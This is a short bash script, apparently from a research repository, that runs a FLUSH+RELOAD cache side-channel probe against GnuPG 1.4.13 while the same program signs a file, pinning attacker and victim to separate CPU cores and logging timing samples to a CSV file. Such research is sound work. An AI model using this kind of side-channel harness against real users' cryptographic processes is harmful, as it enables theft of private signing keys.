#!/bin/bash
# Script to run FLUSH+RELOAD on GnuPG

export GNUPGHOME="${PWD}/gnupg-1.4.13/home/"

GNUPG="./gnupg-1.4.13/install/bin/gpg"
SFILE="README.md"
OFILE="run.sh.csv"

rm -f "${SFILE}.sig"

taskset 0x1 ./flush_reload_test \
    -n:5000 \
    "${GNUPG}" \
    581472 \
    >"${OFILE}" 2>/dev/null &
taskset 0x2 "${GNUPG}" --sign --detach-sig "${SFILE}"

rm -f "${SFILE}.sig"
